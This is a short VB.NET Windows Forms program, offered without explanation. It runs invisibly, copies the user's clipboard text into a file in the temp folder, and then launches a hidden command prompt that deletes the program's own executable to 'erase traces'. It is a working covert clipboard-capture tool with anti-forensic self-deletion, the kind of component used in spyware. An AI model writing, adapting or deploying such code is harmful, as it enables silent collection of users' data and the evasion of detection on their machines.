Imports System.IO

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Visible = False
        If My.Computer.Clipboard.ContainsText() Then
            Label1.Text = My.Computer.Clipboard.GetText()
        Else
            Label1.Text = "Clipboard did not have text, instead could be and image, data, mp3 or other."
        End If

        If File.Exists(IO.Path.GetTempPath & "clip.txt") Then
            Try
                System.IO.File.Delete(IO.Path.GetTempPath & "clip.txt")
            Catch ex As Exception

            End Try
        Else

        End If


        Try
            Dim filePath As String =
  String.Format(IO.Path.GetTempPath & "clip.txt")
            Using writer As New StreamWriter(filePath, True)
                If File.Exists(filePath) Then
                    writer.WriteLine(Label1.Text)
                Else
                    writer.WriteLine(Label1.Text)
                End If
            End Using
        Catch ex As Exception

        End Try


        Dim erasetraces As ProcessStartInfo = New ProcessStartInfo()

        erasetraces.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " _
         & Application.ExecutablePath
        erasetraces.WindowStyle = ProcessWindowStyle.Hidden
        erasetraces.CreateNoWindow = True
        erasetraces.FileName = "cmd.exe"

        Process.Start(erasetraces)


        Application.Exit()
    End Sub


End Class
